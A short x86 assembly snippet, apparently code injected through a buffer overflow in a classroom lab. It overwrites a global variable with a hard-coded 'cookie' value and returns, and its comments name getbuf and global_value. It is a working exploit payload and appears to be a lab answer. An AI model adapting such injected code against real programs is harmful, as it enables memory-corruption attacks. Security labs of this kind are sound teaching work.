.align 4
movl $0x804b324, %eax   #Move address of global_value as  ret address for getbuf
movl $0x113e3b05, (%eax)  #Write cookie value into global_value
ret
 


